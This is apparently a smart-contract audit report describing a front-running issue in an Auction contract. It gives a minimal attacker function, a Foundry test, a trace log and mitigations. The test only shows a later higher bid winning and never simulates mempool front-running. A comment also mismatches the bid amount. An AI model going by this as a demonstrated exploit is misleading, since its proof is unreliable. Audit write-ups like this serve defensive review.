# Proof of Concept: Front-Running Vulnerability in Auction Contract

## Description
The Auction contract’s bid() function allows an attacker to front-run legitimate bids by observing pending transactions in the mempool and submitting a higher bid with more gas. This overwrites the legitimate bidder’s transaction, making the attacker the highest bidder.

## Impact
- *Severity*: High
- *Effect*: Legitimate bidders lose their bids, and the attacker wins the auction, potentially causing financial loss or unfair outcomes for users.

## Likelihood
- *Probability*: High
- *Reason*: Ethereum’s public mempool allows attackers to monitor and front-run transactions, especially in high-value auctions without mitigation.

## Proof of Concept
1. *Setup*: Deploy the Auction contract with a 1-day bidding period.
2. *Attack Steps*:
   - A legitimate bidder submits a transaction with a 1 ETH bid.
   - The attacker observes the transaction in the mempool.
   - The attacker submits a 1.1 ETH bid with higher gas, which gets mined first.
   - The attacker becomes the highestBidder, overwriting the legitimate bid.
3. *Code Snippet*:
   ```solidity
   // Attacker script
   function attack(address auctionAddr) external payable {
       Auction(auctionAddr).bid{value: msg.value}();
   }

4. TEST CASE

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {Auction} from "../src/Auction.sol";

import {Test} from "forge-std/Test.sol";

contract AuctionTest is Test {
    Auction public auction;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        auction = new Auction(86400);

        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function testFrontrunningAttack() public {
        // Simulate Alice placing a legitimate bid of 1 ETH
        vm.prank(alice);
        auction.bid{value: 1 ether}();

        // Simulate Bob front-running with a higher bid of 2 ETH
        vm.prank(bob);
        auction.bid{value: 1.1 ether}();

        // Assertions
        assertEq(
            auction.highestBidder(),
            bob,
            "Bob should be the highest bidder"
        );
        assertEq(
            auction.highestBid(),
            1.1 ether,
            "Highest bid should be 1.1 ETH"
        );
    }
}
```
5. Log Traces
```
Traces:
  [89581] AuctionTest::testFrontrunningAttack()
    ├─ [0] VM::prank(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])
    │   └─ ← [Return] 
    ├─ [48278] Auction::bid{value: 1000000000000000000}()
    │   ├─ emit BidPlaced(bidder: alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6], amount: 1000000000000000000 [1e18])
    │   └─ ← [Stop] 
    ├─ [0] VM::prank(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e])
    │   └─ ← [Return] 
    ├─ [9615] Auction::bid{value: 1100000000000000000}()
    │   ├─ [0] alice::fallback{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ emit BidPlaced(bidder: bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e], amount: 1100000000000000000 [1.1e18])
    │   └─ ← [Stop] 
    ├─ [551] Auction::highestBidder() [staticcall]
    │   └─ ← [Return] bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]
    ├─ [0] VM::assertEq(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e], bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e], "Bob should be the highest bidder") [staticcall]
    │   └─ ← [Return] 
    ├─ [491] Auction::highestBid() [staticcall]
    │   └─ ← [Return] 1100000000000000000 [1.1e18]
    ├─ [0] VM::assertEq(1100000000000000000 [1.1e18], 1100000000000000000 [1.1e18], "Highest bid should be 1.1 ETH") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

## RECOMMENDED MITIGATIONS
- Use a commit-reveal-scheme: Bidders commit a hash of their bid, then reveal later.
- Implement gas limits or time-locks to reduce front running windows
- Use a private memepool or layer-2 solution to hide transaction details
